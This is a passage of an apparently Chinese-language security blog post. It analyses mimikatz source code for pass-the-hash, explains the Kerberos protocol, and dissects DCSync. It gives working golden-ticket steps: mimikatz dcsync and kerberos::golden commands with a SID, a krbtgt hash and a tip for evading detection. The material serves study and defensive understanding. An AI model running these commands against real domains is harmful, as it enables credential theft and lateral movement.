class="number">0</span>, NULL&#125;, &#123;<span class="number">21</span>,  -<span class="number">4</span>&#125;&#125;,</div><div class="line">&#123;KULL_M_WIN_BUILD_7,&#123;sizeof(PTRN_WN61_LogonSessionList),PTRN_WN61_LogonSessionList&#125;,&#123;<span class="number">0</span>, NULL&#125;, &#123;<span class="number">19</span>,  -<span class="number">4</span>&#125;&#125;,</div><div class="line">&#123;KULL_M_WIN_BUILD_8,&#123;sizeof(PTRN_WN6x_LogonSessionList),PTRN_WN6x_LogonSessionList&#125;,&#123;<span class="number">0</span>, NULL&#125;, &#123;<span class="number">16</span>,  -<span class="number">4</span>&#125;&#125;,</div><div class="line">&#123;KULL_M_WIN_BUILD_BLUE,&#123;sizeof(PTRN_WN63_LogonSessionList),PTRN_WN63_LogonSessionList&#125;,&#123;<span class="number">0</span>, NULL&#125;, &#123;<span class="number">36</span>,  -<span class="number">6</span>&#125;&#125;,</div><div class="line">&#123;KULL_M_WIN_BUILD_10_1507,&#123;sizeof(PTRN_WN6x_LogonSessionList),PTRN_WN6x_LogonSessionList&#125;,&#123;<span class="number">0</span>, NULL&#125;, &#123;<span class="number">16</span>,  -<span class="number">4</span>&#125;&#125;,</div><div class="line">&#123;KULL_M_WIN_BUILD_10_1703,&#123;sizeof(PTRN_WN1703_LogonSessionList),PTRN_WN1703_LogonSessionList&#125;,&#123;<span class="number">0</span>, NULL&#125;, &#123;<span class="number">23</span>,  -<span class="number">4</span>&#125;&#125;,</div><div class="line">&#123;KULL_M_WIN_BUILD_10_1803,&#123;sizeof(PTRN_WN1803_LogonSessionList),PTRN_WN1803_LogonSessionList&#125;,&#123;<span class="number">0</span>, NULL&#125;, &#123;<span class="number">23</span>,  -<span class="number">4</span>&#125;&#125;,</div><div class="line">&#123;KULL_M_WIN_BUILD_10_1903,&#123;sizeof(PTRN_WN6x_LogonSessionList),PTRN_WN6x_LogonSessionList&#125;,&#123;<span class="number">0</span>, NULL&#125;, &#123;<span class="number">23</span>,  -<span class="number">4</span>&#125;&#125;,</div><div class="line">&#123;KULL_M_WIN_BUILD_2022,&#123;sizeof(PTRN_WN11_LogonSessionList),PTRN_WN11_LogonSessionList&#125;,&#123;<span class="number">0</span>, NULL&#125;, &#123;<span class="number">24</span>,  -<span class="number">4</span>&#125;&#125;,</div><div class="line">&#125;;</div></pre></td></tr></table></figure></li><li><p>首先调用kull_m_patch_getGenericFromBuild()函数，其会根据系统版本选择指定的特征码。</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">PKULL_M_PATCH_GENERIC kull_m_patch_getGenericFromBuild(PKULL_M_PATCH_GENERIC generics, SIZE_T cbGenerics, DWORD <span class="keyword">BuildNumber)</span></div><div class="line"><span class="keyword">&#123;</span></div><div class="line"><span class="keyword"></span>SIZE_T i<span class="comment">;</span></div><div class="line">PKULL_M_PATCH_GENERIC current = NULL<span class="comment">;</span></div><div class="line"></div><div class="line">for(i = <span class="number">0</span><span class="comment">; i &lt; cbGenerics; i++)</span></div><div class="line">&#123;</div><div class="line">if(generics[i].MinBuildNumber &lt;= <span class="keyword">BuildNumber)</span></div><div class="line"><span class="keyword"></span>current = &amp;generics[i]<span class="comment">;</span></div><div class="line">else <span class="keyword">break;</span></div><div class="line"><span class="keyword"></span>&#125;</div><div class="line">return current<span class="comment">;</span></div><div class="line">&#125;</div></pre></td></tr></table></figure></li><li><p>然后调用kull_m_memory_search搜索指定特征码的地址</p><figure class="highlight lisp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">for(<span class="name">CurrentPtr</span> = (<span class="name">PBYTE</span>) Search-&gt;kull_m_memoryRange.kull_m_memoryAdress.address<span class="comment">; !status &amp;&amp; (CurrentPtr + Length &lt;= limite); CurrentPtr++)</span></div><div class="line">status = RtlEqualMemory(<span class="name">Pattern-&gt;address</span>, CurrentPtr, Length)<span class="comment">;</span></div><div class="line">CurrentPtr--<span class="comment">;</span></div></pre></td></tr></table></figure></li><li><p>调用lsassLocalHelper-&gt;AcquireKeys()函数，本质是调用kuhl_m_sekurlsa_nt6_acquireKeys()函数。其本质和kuhl_m_sekurlsa_utils_search_generic()函数一样，都是先调用kull_m_patch_getGenericFromBuild选择合适的特征码，然后搜索。其目的是为了寻找用于加密凭证的秘钥，因为凭证在内存中加密存储的。其实windows并不是直接比较里面的NTLM散列，而是比较经过加密之后的散列的密文。然后调用利用寻找到的秘钥调用BCryptGenerateSymmetricKey生成秘钥。</p><figure class="highlight lsl"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">KULL_M_PATCH_GENERIC PTRN_WIN8_LsaInitializeProtectedMemory_KeyRef[] = &#123; <span class="comment">// InitializationVector, h3DesKey, hAesKey</span></div><div class="line">&#123;KULL_M_WIN_BUILD_VISTA,&#123;sizeof(PTRN_WNO8_LsaInitializeProtectedMemory_KEY),PTRN_WNO8_LsaInitializeProtectedMemory_KEY&#125;, &#123;<span class="number">0</span>, NULL&#125;, &#123;<span class="number">63</span>, <span class="number">-69</span>, <span class="number">25</span>&#125;&#125;,</div><div class="line">&#123;KULL_M_WIN_BUILD_7,&#123;sizeof(PTRN_WNO8_LsaInitializeProtectedMemory_KEY),PTRN_WNO8_LsaInitializeProtectedMemory_KEY&#125;, &#123;<span class="number">0</span>, NULL&#125;, &#123;<span class="number">59</span>, <span class="number">-61</span>, <span class="number">25</span>&#125;&#125;,</div><div class="line">&#123;KULL_M_WIN_BUILD_8,&#123;sizeof(PTRN_WIN8_LsaInitializeProtectedMemory_KEY),PTRN_WIN8_LsaInitializeProtectedMemory_KEY&#125;, &#123;<span class="number">0</span>, NULL&#125;, &#123;<span class="number">62</span>, <span class="number">-70</span>, <span class="number">23</span>&#125;&#125;,</div><div class="line">&#123;KULL_M_WIN_BUILD_10_1507,&#123;sizeof(PTRN_WN10_LsaInitializeProtectedMemory_KEY),PTRN_WN10_LsaInitializeProtectedMemory_KEY&#125;, &#123;<span class="number">0</span>, NULL&#125;, &#123;<span class="number">61</span>, <span class="number">-73</span>, <span class="number">16</span>&#125;&#125;,</div><div class="line">&#123;KULL_M_WIN_BUILD_10_1809,&#123;sizeof(PTRN_WN10_LsaInitializeProtectedMemory_KEY),PTRN_WN10_LsaInitializeProtectedMemory_KEY&#125;, &#123;<span class="number">0</span>, NULL&#125;, &#123;<span class="number">67</span>, <span class="number">-89</span>, <span class="number">16</span>&#125;&#125;,</div><div class="line">&#125;;</div></pre></td></tr></table></figure><p>  <img src="http://hacky.wang/blog/20220217/cIDEWiDFgUuh.png?imageslim" alt="mark"></p></li><li><p>调用kuhl_m_sekurlsa_enum寻找登录凭证，最终调用kuhl_m_sekurlsa_enum_callback_msv_pth函数将加密之后的凭证写入Lsass.exe进程的指定的LogonSessionList数组中。首先比较是否是指定的LogonId。然后调用kuhl_m_sekurlsa_msv_enum_cred()函数</p><figure class="highlight zephir"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">BOOL</span> CALLBACK kuhl_m_sekurlsa_enum_callback_msv_pth(IN PKIWI_BASIC_SECURITY_LOGON_SESSION_DATA pData, IN OPTIONAL LPVOID pOptionalData)</div><div class="line">&#123;</div><div class="line">PSEKURLSA_PTH_DATA pthData = (PSEKURLSA_PTH_DATA) pOptionalData;</div><div class="line">MSV1_0_PTH_DATA_CRED credData = &#123;pData, pthData&#125;;</div><div class="line"><span class="keyword">if</span>(SecEqualLuid(pData-&gt;LogonId, pthData-&gt;LogonId))</div><div class="line">&#123;</div><div class="line">kuhl_m_sekurlsa_msv_enum_cred(pData-&gt;cLsass, pData-&gt;pCredentials, kuhl_m_sekurlsa_msv_enum_cred_callback_pth, &amp;credData);</div><div class="line"><span class="keyword">return</span> <span class="keyword">FALSE</span>;</div><div class="line">&#125;</div><div class="line"><span class="keyword">else</span> <span class="keyword">return</span> <span class="keyword">TRUE</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure></li><li><p>最终调用kuhl_m_sekurlsa_msv_enum_cred_callback_pth，在kuhl_m_sekurlsa_msv_enum_cred_callback_pth函数中，首先会调用kuhl_m_sekurlsa_nt6_LsaEncryptMemory函数加密NTLM散列。其加密逻辑是如果加密的凭证能被8整除，则使用AES，否则使用3DES。</p><figure class="highlight xl"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div></pre></td><td class="code"><pre><div class="line">(*<span class="function"><span class="title">pthDataCred</span>-&gt;</span><span class="function"><span class="title">pSecData</span>-&gt;</span><span class="function"><span class="title">lsassLocalHelper</span>-&gt;</span><span class="function"><span class="title">pLsaProtectMemory</span>)(msvCredentials, pCredentials-&gt;</span>Credentials.Length);</div><div class="line">VOID WINAPI kuhl_m_sekurlsa_nt6_LsaProtectMemory(IN PVOID Buffer, IN ULONG BufferSize)</div><div class="line">&#123;</div><div class="line">kuhl_m_sekurlsa_nt6_LsaEncryptMemory((PUCHAR) Buffer, BufferSize, TRUE);</div><div class="line">&#125;</div><div class="line"><span class="comment">//////加密逻辑</span></div><div class="line"><span class="keyword">if</span>(cbMemory % <span class="number">8</span>)</div><div class="line">&#123;</div><div class="line">hKey = &amp;kAes.hKey;</div><div class="line">cbIV = sizeof(InitializationVector);</div><div class="line">&#125;</div><div class="line"><span class="keyword">else</span></div><div class="line">&#123;</div><div class="line">hKey = &amp;k3Des.hKey;</div><div class="line">cbIV = sizeof(InitializationVector) / <span class="number">2</span>;</div><div class="line">&#125;</div><div class="line">__try</div><div class="line">&#123;</div><div class="line">status = cryptFunc(*hKey, pMemory, cbMemory, <span class="number">0</span>, LocalInitializationVector, cbIV, pMemory, cbMemory, &amp;cbResult, <span class="number">0</span>);</div><div class="line">&#125;</div></pre></td></tr></table></figure></li><li><p>然后调用kull_m_memory_copy函数中的WriteProcessMemory写入Lsass.exe进程空间。最后Resume线程。完事PtH。</p><figure class="highlight xl"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">case KULL_M_MEMORY_TYPE_OWN:</div><div class="line"><span class="function"><span class="title">status</span> = WriteProcessMemory(Destination-&gt;</span><span class="function"><span class="title">hMemory</span>-&gt;</span><span class="function"><span class="title">pHandleProcess</span>-&gt;</span><span class="function"><span class="title">hProcess</span>, Destination-&gt;</span><span class="function"><span class="title">address</span>, Source-&gt;</span>address, Length, NULL);</div><div class="line">break;</div></pre></td></tr></table></figure></li></ul><h2 id="NTLM-凭证生成"><a href="#NTLM-凭证生成" class="headerlink" title="NTLM 凭证生成"></a>NTLM 凭证生成</h2><ul><li><code>msv1_0!LsaApLogonUserEx2</code>—&gt;<code>lsasrv!LsapCreateLsaLogonSession</code>—-&gt;<code>msv1_0!SpAcceptCredentials</code></li></ul><h2 id="Kerberos认证协议"><a href="#Kerberos认证协议" class="headerlink" title="Kerberos认证协议"></a>Kerberos认证协议</h2><ul><li><p>Kerberos协议的组成角色：</p><ul><li>客户端：发送请求的一方</li><li>服务端：接收请求的一方</li><li>秘钥分发中心(Key Distribution Center KDC),KDC分为两部分：<ul><li>AS(Authentication Server)：用于认证客服端，以及发放后续客户端用于访问TGS(Ticket Granting Server)的TGT(凭据授予票据Ticket Granting Ticket)</li><li>TGS(Ticket Granting Server):同于发放认证过程和客户端访问服务端的票据</li></ul></li></ul></li><li><p>Kerberos协议通过引入同时认识客户端(A)和服务端(B)的秘钥分发中心(C)实现身份认证。简化的流程如下：</p><ul><li>第一步：客户端向KDC请求获取访问服务端的服务授予票据</li><li>第二歩：客户端拿着服务授予票据访问服务端</li></ul></li><li><p>上述步骤存在的问题：</p><ul><li>1.KDC如何判断客户端的安全性(真实性)？</li><li>2.服务端如何判断客户端的服务授予票据的真实性？</li></ul></li><li><p>Kerberos认证协议的前提：</p><ul><li>Kerberos存在一个数据库，运维人员会添加可以使用认证服务的人员和网络服务。相当于一个白名单。</li><li>当用户被添加到数据库，会根据当前的密码生成一把秘钥存储在数据库中(很重要)。并且保存用户的基本信息，以供认证。</li><li>只要两两通讯就会进行认证。</li></ul></li><li><p>两个个人理解的概念：机器秘钥(与机器密码强相关的秘钥)，会话秘钥(CT_SK,CS_SK)本次会话中使用的秘钥，会消失。</p></li></ul><h3 id="Kerberos协议第1次通讯"><a href="#Kerberos协议第1次通讯" class="headerlink" title="Kerberos协议第1次通讯"></a>Kerberos协议第1次通讯</h3><ul><li>客户端行为：<ul><li>1.客户端明文向KDC发送请求，该次请求中携带了自己的用户名，主机IP，和当前时间戳</li></ul></li><li><p>KDC行为：</p><ul><li>1.KDC(其中的AS认证服务器)在数据库中比较，是否存在该用户名的用户，<strong>但是不会判断身份的可靠性</strong></li><li>2.如果没有该用户名，认证失败。如果存在，则发送下面两部分数据给客户端<ul><li>TGT(Ticket Granting Ticket即票据授予票据,TGT客户端使用TGT去KDC获取服务授予票据):TGT包含客户端的Name,Ip,时间戳，TGS_Name，TGT的有效时间，以及<strong>一把客户端和TGS通讯的CT_SK(Client And TGS Session Key CT_SK)</strong>。TGT使用TGS的秘钥进行加密(客户端无法解密)，并且秘钥并没有在网络上传播(不存在在线盗取秘钥)。</li><li>将CT_SK,TGS_Name,TGT的有效时间，当前时间戳等数据使用<strong>客户端的秘钥(保存在数据库中)</strong>加密的数据。该秘钥并没有在网络上传播(不存在在线盗取秘钥)。</li></ul></li></ul></li><li><p>总结：KDC总是会传递两部分数据，一部分是客户端能解密的数据(KDC存在客户端秘钥)，第二部分是客户端不能解密的数据(使用TGS秘钥)，<strong>重点是将使用客户端秘钥加密过的CT_SK传递给客户端，避免CT_SK中间被窃取，因为非法的客户端不存在真实的客户端秘钥！这样就实现了CT_SK的传递</strong>。</p></li><li>备注：<strong>凭据信息(TGT,ST)是由和机器密码强相关的秘钥进行加密，主机秘钥在网络中不传递。由来校验加密数据的端点信息和凭据中的端点信息。第一次通讯主要有两个目的，第一，验证客户端是否存在，第二，传递CT_KS会话秘钥。</strong></li></ul><h3 id="Kerberos协议第2次通讯"><a href="#Kerberos协议第2次通讯" class="headerlink" title="Kerberos协议第2次通讯"></a>Kerberos协议第2次通讯</h3><ul><li>客户端行为：<ul><li>1.客户端接收上述KDC发送的TGT和加密数据，利用自己的秘钥解密加密数据，<strong>并获取CT_SK会话秘钥</strong>。如果获取的时间戳和自己发送的时间戳差值大于5mins，则认证结束。否则客户端向TGS发送请求。</li><li>2.利用接收到的CT_SK(Session Key)加密自身的客户端信息，包括客户端名，ip，时间戳。</li><li>3.客户端向KDC发送要访问的服务端的明文信息。</li><li>4.客户端向KDC发送没改变的TGT。</li></ul></li><li><p>TGS行为：</p><ul><li>1.TGS验证客户端明文发送的服务端信息,如果不存在，则认证结束。</li><li>2.TGS利用自身的秘钥解密TGT，得到时间戳和CT_SK,如果时间超过5mins，则认证结束。</li><li>3.使用CT_SK解密客户端发送的客户端信息，比较这个客户端信息和TGT里面的客户端信息进行比对。如果不同则，认证结束。</li><li>4.KDC发送响应内容给客户端：<ul><li>服务端秘钥加密的Ticket(ST),内容包括：客户端信息，Serivce IP，ST的有效时间，时间戳，以及客户端服务端通信的CS_SK</li><li>使用CT_SK加密的内容，其中包括CS_SK，时间戳,ST的有效期。此时客户端已经使用自身的秘钥解密的第一次通讯接收的第二部分数据，获取了CT_SK，<strong>并进行了缓存</strong>。</li></ul></li></ul></li><li><p>总结：本次通讯，有三个目的，第一：客户端会发送服务端信息以让TGS确认<strong>是否存在服务端</strong>，以及CT_SK加密之后的客户端信息和TGT，以让TGS比较两个数据中保存的<strong>客户端信息是否相同</strong>。并<strong>传递ST和包含CS_SK会话秘钥</strong>的加密数据。</p></li><li>备注：<strong>每一次通讯，KDC都会把下一次通讯所需要的会话秘钥传递给客户端。并且客户端每次都会发送两次包含自身数据的报文给校验者从而校验自身，其中TGT和ST的机器秘钥(TGS和服务端机器秘钥)都不经过传递，保证安全性。</strong></li></ul><h3 id="Kerberos协议第3次通讯"><a href="#Kerberos协议第3次通讯" class="headerlink" title="Kerberos协议第3次通讯"></a>Kerberos协议第3次通讯</h3><ul><li>客户端行为<ul><li>1.客户端收到KDC的响应，解密有CT_SK加密的第二部分数据，确认无误后，<strong>并获取CS_SK会话秘钥</strong>继续。</li><li>2.客户端使用CS_SK将自己主机信息和时间戳加密发送给服务端</li><li>3.客户端将第二次通讯获得的服务端凭证ST发送给服务端</li></ul></li><li><p>服务端行为</p><ul><li>1.服务端接收到客户端发来的两部分数据后，服务端使用服务端秘钥解密ST，校验时间戳。</li><li>2.使用CS_SK解密客户端发来的第一部分数据，得到TGS认证过的客户端信息。然后对比这部分数据的客户端信息和经过服务端秘钥加密的ST的客户端信息，判断客户端的合理性。</li><li>3.服务端返回的CT_SK加密的数据，以是的客户端确认服务端身份。就此，Kerberos认证完成。</li></ul></li><li><p>总结：第三次通讯，服务端利用自身的秘钥解密ST，获取其中的客户端信息，然后<strong>比较客户端发来的客户端信息</strong>。从而客户端的合理性。</p></li></ul><p>Ref:<a href="https://seevae.github.io/2020/09/12/详解kerberos认证流程/" target="_blank" rel="external">详解kerberos认证流程</a></p><h2 id="Pass-The-Ticket"><a href="#Pass-The-Ticket" class="headerlink" title="Pass The Ticket"></a>Pass The Ticket</h2><ul><li>Ptt主要在域内进行横向移动的技术。</li></ul><h3 id="黄金票据"><a href="#黄金票据" class="headerlink" title="黄金票据"></a>黄金票据</h3><ul><li>特点：有效时间长(默认是十年)，不会因为密码的修改导致票据的失效，用户名可以是任意的虚拟的。</li><li><p>制作黄金票据的前提：</p><ul><li>域名称</li><li>SID</li><li>域的kbrtgt的Hash(要求短暂的拿到域控服务器的控制权)</li><li>任意用户名</li></ul></li><li><p>在域控服务器中(备注，也可以不登录域控即可获取<a href="https://www.freebuf.com/articles/network/286137.html" target="_blank" rel="external">https://www.freebuf.com/articles/network/286137.html</a>)，使用<code>mimikatz.exe &quot;lsadump::dcsync /domain:corp.hacky.ren /user:krbtgt&quot; &gt;&gt; golden.txt</code>,可以得到SID以及kbrtgt的Hash，以及域名称。<br>  <img src="http://hacky.wang/blog/20220224/v1o2BzRHGqRi.png?imageslim" alt="mark"></p></li><li><p>在非域控主机中，使用<code>mimikatz.exe &quot;kerberos::golden /admin:hacky /domain:corp.hacky.ren /sid:S-1-5-21-442036050-123597327-3835497791 kbrgtg:ac9a6f3e6ea0f74274725c39179f44a1 /ptt&quot;</code>生成黄金票据，并将其导入内存。</p><ul><li>/admin参数：表示任意伪造的用户名(最好改为受控的主机名，因为部分安全产品是通过检索登录的域账户是否存在而检测PtT)</li><li>/sid:sid数值，取最后一个“-”之前的内容</li><li>/ptt:直接导入内存，这样就不需要使用”kerberos::ptt导入了”<br><img src="http://hacky.wang/blog/20220224/IlxDKwvIESBp.png?imageslim" alt="mark"></li></ul></li><li><p>使用<code>klist</code>或者<code>kerberos::list</code>查看伪造的金票是否被导入。<br>  <img src="http://hacky.wang/blog/20220224/qYBfHpfYehbB.png?imageslim" alt="mark"></p></li><li><p>修改域控服务器密码为abcd.123，然后在远程登录域控，测试金票是否有效。<br>  <img src="http://hacky.wang/blog/20220224/cgK4nT1YidQt.png?imageslim" alt="mark"></p></li><li><p>Ref:</p><ul><li><a href="https://www.freebuf.com/articles/network/286137.html" target="_blank" rel="external">内网渗透测试：DCSync 攻击技术的利用</a></li><li><a href="https://shu1l.github.io/2020/06/06/qian-xi-huang-jin-piao-ju-yu-bai-yin-piao-ju/" target="_blank" rel="external">浅析黄金票据与白银票据</a></li></ul></li></ul><h3 id="lsadump-dcsync-源码分析"><a href="#lsadump-dcsync-源码分析" class="headerlink" title="lsadump::dcsync 源码分析"></a>lsadump::dcsync 源码分析</h3><ul><li><p>原理：不同的域控制器(DC)会进行数据同步复制，mimikatz通过模拟一个域控制器，通过GetNCChanges函数向真实的域控制器发送数据同步复制请求，获取控制器指定的用户的口令Hash。dcsync的主要特点是不需要登录域控服务器而获取用户口令HASH。需要注意的是，DCSync 攻击的对象如果是 RODC 域控制器，则会失效，因为 RODC是不能参与复制同步数据。</p></li><li><p>lsadump::dcsync命令源码位于<code>\mimikatz\modules\lsadump\kuhl_m_lsadump_dc.c</code>中的<code>NTSTATUS kuhl_m_lsadump_dcsync(int argc, wchar_t * argv[])</code>函数中。</p></li><li><p>首先，通过<code>kull_m_net_getDC(szDomain, DS_DIRECTORY_SERVICE_REQUIRED, &amp;szTmpDc)</code>寻找域内的域控服务器，其本质会调用<code>DsGetDcName</code>API函数。</p></li><li><p>然后，通过<code>IDL_DRSGetNCChanges</code>函数，向真实域控服务器发送请求，以获取用户信息。</p><figure class="highlight lisp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">RtlZeroMemory(<span class="name">&amp;getChRep</span>, sizeof(<span class="name">DRS_MSG_GETCHGREPLY</span>))<span class="comment">;</span></div><div class="line">drsStatus = IDL_DRSGetNCChanges(<span class="name">hDrs</span>, <span class="number">8</span>, <span class="symbol">&amp;getChReq</span>, <span class="symbol">&amp;dwOutVersion</span>, <span class="symbol">&amp;getChRep</span>)<span class="comment">;</span></div></pre></td></tr></table></figure></li><li><p>几个重要的结构体</p><figure class="highlight elm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div></pre></td><td class="code"><pre><div class="line">//<span class="type">DRS_MSG_GETCHGREPLY</span>:用于接收<span class="type">IDL_DRSGetNCChanges</span>传来的响应消息</div><div class="line">typedef union _DRS_MSG_GETCHGREPLY &#123;</div><div class="line"><span class="type">DRS_MSG_GETCHGREPLY_V6</span> <span class="type">V6</span>;</div><div class="line">&#125; <span class="type">DRS_MSG_GETCHGREPLY</span>;</div><div class="line">//////</div><div class="line">//<span class="type">DRS_MSG_GETCHGREPLY_V6</span>表示<span class="type">DRS_MSG_GETCHGREPLY</span>的第六个版本</div><div class="line">typedef struct _DRS_MSG_GETCHGREPLY_V6 &#123;</div><div class="line"><span class="type">UUID</span> uuidDsaObjSrc;</div><div class="line"><span class="type">UUID</span> uuidInvocIdSrc;</div><div class="line"><span class="type">DSNAME</span> *pNC;</div><div class="line"><span class="type">USN_VECTOR</span> usnvecFrom;</div><div class="line"><span class="type">USN_VECTOR</span> usnvecTo;</div><div class="line"><span class="type">UPTODATE_VECTOR_V2_EXT</span> *pUpToDateVecSrc;</div><div class="line"><span class="type">SCHEMA_PREFIX_TABLE</span> <span class="type">PrefixTableSrc</span>;</div><div class="line"><span class="type">ULONG</span> ulExtendedRet;</div><div class="line"><span class="type">ULONG</span> cNumObjects;</div><div class="line"><span class="type">ULONG</span> cNumBytes;</div><div class="line"><span class="type">REPLENTINFLIST</span> *pObjects;</div><div class="line"><span class="type">BOOL</span> fMoreData;</div><div class="line"><span class="type">ULONG</span> cNumNcSizeObjects;</div><div class="line"><span class="type">ULONG</span> cNumNcSizeValues;</div><div class="line"><span class="type">DWORD</span> cNumValues;</div><div class="line"><span class="type">REPLVALINF_V1</span> *rgValues;</div><div class="line"><span class="type">DWORD</span> dwDRSError;</div><div class="line">&#125; <span class="type">DRS_MSG_GETCHGREPLY_V6</span>;</div><div class="line">/////////</div><div class="line">//<span class="type">PrefixTableSrc</span>定义了从<span class="type">OID</span>到<span class="type">ATTRTYP</span>值的映射表</div><div class="line">typedef struct _SCHEMA_PREFIX_TABLE &#123;</div><div class="line"><span class="type">DWORD</span> <span class="type">PrefixCount</span>;   //<span class="type">PrefixTableEntry</span>的数量</div><div class="line"><span class="type">PrefixTableEntry</span> *pPrefixEntry; //包含了<span class="type">PrefixTableEntry</span>的数组</div><div class="line">&#125; <span class="type">SCHEMA_PREFIX_TABLE</span>;</div><div class="line">////</div><div class="line">//<span class="type">REPLENTINFLIST</span>包含了给定对象(<span class="type">Object</span>)的一个或多个属性</div><div class="line"> typedef struct <span class="type">REPLENTINFLIST</span> &#123;</div><div class="line">   struct <span class="type">REPLENTINFLIST</span>* pNextEntInf;</div><div class="line">   <span class="type">ENTINF</span> <span class="type">Entinf</span>;</div><div class="line">   <span class="type">BOOL</span> fIsNCPrefix;</div><div class="line">   <span class="type">UUID</span>* pParentGuid;</div><div class="line">   <span class="type">PROPERTY_META_DATA_EXT_VECTOR</span>* pMetaDataExt;</div><div class="line"> &#125; <span class="type">REPLENTINFLIST</span>;</div><div class="line">/////</div><div class="line">//<span class="type">AttrBlock</span> 简单的理解为属性块</div></pre></td></tr></table></figure></li><li><p>kuhl_m_lsadump_dcsync_descrObject()函数解析/描述对象，其函数原型如下,其中第一个参数prefixTable和第二个参数attributes分别表示OID和ATTRTYP的映射表，AttrBlock表示一个属性块。其最终会返回一个<code>ATTRVALBLOCK</code>结构</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">void kuhl_m_lsadump_dcsync_descrObject(<span class="keyword">SCHEMA_PREFIX_TABLE </span>*<span class="keyword">prefixTable, </span></div><div class="line">ATTRBLOCK *attributes, </div><div class="line">LPCWSTR szSrcDomain, </div><div class="line"><span class="keyword">BOOL </span>someExport, </div><div class="line">ATTRTYP *pSuppATT_IntId, </div><div class="line">DWORD cSuppATT_IntId)</div></pre></td></tr></table></figure></li><li><p>kuhl_m_lsadump_dcsync_descrObject最终会调用kull_m_rpc_drsr_findMonoAttr用户获取指定OID对应的属性值，其中最最最重要的是<code>kull_m_rpc_drsr_findAttr</code>函数，其函数原型如下。其会调用<code>kull_m_rpc_drsr_MakeAttid</code>函数，通过传入的OID生成一个ATTRTYP结构。</p><figure class="highlight lisp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">ATTRVALBLOCK * kull_m_rpc_drsr_findAttr(</div><div class="line">SCHEMA_PREFIX_TABLE *prefixTable, </div><div class="line">ATTRBLOCK *attributes, </div><div class="line">LPCSTR szOid)</div></pre></td></tr></table></figure></li><li><p>kull_m_rpc_drsr_MakeAttid函数源码如下,很显然，kull_m_rpc_drsr_MakeAttid()首先会截取OID的最后一个数字，接着调用kull_m_rpc_drsr_MakeAttid_addPrefixToTable()取ndx。然后将取到的ndx左移16位，再或运算之后，得到ATTRTYP，这其实是一个ULONG类型。</p><figure class="highlight objectivec"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div></pre></td><td class="code"><pre><div class="line"><span class="built_in">BOOL</span> kull_m_rpc_drsr_MakeAttid(SCHEMA_PREFIX_TABLE *prefixTable, LPCSTR szOid, ATTRTYP *att, <span class="built_in">BOOL</span> toAdd)</div><div class="line">&#123;</div><div class="line"><span class="built_in">BOOL</span> status = <span class="literal">FALSE</span>;</div><div class="line">DWORD lastValue, ndx;</div><div class="line">PSTR lastValueString;</div><div class="line">OssEncodedOID oidPrefix;</div><div class="line"><span class="keyword">if</span>(lastValueString = strrchr(szOid, <span class="string">'.'</span>))</div><div class="line">&#123;</div><div class="line"><span class="keyword">if</span>(*(lastValueString + <span class="number">1</span>))</div><div class="line">&#123;</div><div class="line">lastValueString++;</div><div class="line">lastValue = strtoul(lastValueString, <span class="literal">NULL</span>, <span class="number">0</span>);</div><div class="line">*att = (WORD) lastValue % <span class="number">0x4000</span>;</div><div class="line"><span class="keyword">if</span>(*att &gt;= <span class="number">0x4000</span>)</div><div class="line">*att += <span class="number">0x8000</span>;</div><div class="line"><span class="keyword">if</span>(kull_m_asn1_DotVal2Eoid(szOid, &amp;oidPrefix))</div><div class="line">&#123;</div><div class="line">oidPrefix.length -= (lastValue &lt; <span class="number">0x80</span>) ? <span class="number">1</span> : <span class="number">2</span>;</div><div 